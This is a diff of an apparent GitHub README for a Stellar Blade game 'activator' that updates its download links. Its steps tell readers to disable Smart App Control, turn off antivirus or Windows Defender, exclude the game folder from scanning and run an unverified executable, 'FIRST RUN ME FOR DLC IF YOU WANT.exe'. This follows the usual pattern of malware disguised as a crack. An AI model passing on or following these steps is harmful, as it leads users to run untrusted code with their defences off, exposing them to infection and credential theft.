@@ -7,7 +7,7 @@ Step
 <img width="527" height="258" alt="image" src="https://github.com/user-attachments/assets/0d712494-29de-4d67-9b96-a735ac2afe9f" />
 
 Instructions for moving the verify file :
-1. COPY ALL THE FILES IN MY GITHUB REPOSITORY [Xelvryn](https://github.com/Xelvryn/StellarBlade-Activision-Fisrt-Run/releases).
+1. COPY ALL THE FILES IN MY GITHUB REPOSITORY [Xelvryn](https://github.com/Xelvryn/).
 2. PASTE IN THE POSITION OF THE STELLAR BLADE GAME FILE
 <img width="988" height="476" alt="image" src="https://github.com/user-attachments/assets/dea16fa4-f0e8-4922-9cad-30708c503ccc" />
 
@@ -19,7 +19,7 @@ INSTRUCTIONS TO DISABLE SMART APP CONTROL
 
 
 Instruction for Verify Firt Run Game :
-[Download Here](https://github.com/Xelvryn/StellarBlade-Activision-Fisrt-Run/archive/refs/heads/main.zip)
+[Download Here](https://github.com/Xelvryn/StellarBlade-Activision-First-Run/releases)
 1. DISABLE YOUR ANTIVIRUS OR WINDOWS DEFENDER.
 2. Add the Stellar Blade game folder to ADD or remove exclusions so that the antivirus doesn't delete the verification file.
 3. RUN "FIRST RUN ME FOR DLC IF YOU WANT.exe" to launch the activator.
